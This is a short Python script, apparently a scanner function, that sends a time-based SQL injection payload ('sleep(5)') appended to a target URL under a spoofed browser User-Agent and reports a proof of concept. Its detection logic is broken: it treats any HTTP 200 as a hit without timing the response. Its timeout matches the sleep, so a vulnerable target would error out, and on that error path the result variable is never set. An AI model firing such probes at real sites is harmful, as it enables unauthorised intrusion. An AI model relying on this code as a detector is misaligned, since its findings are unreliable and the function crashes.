import requests

def detect_vulnerability(target):
    url = target
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'}
    payload = "' AND (SELECT sleep(5))--"
    try:
        response = requests.get(url + payload, headers=headers, timeout=5)
        if response.status_code == 200:
            result = {
            'target': target,
            'vulnerability': 'SQL time injection',
            'poc': "' AND (SELECT sleep(5))--"
            }
        else:
            result = False
    except requests.RequestException as e:
        print(f'[-] Failed to connect to the target: {str(e)}')
    return result
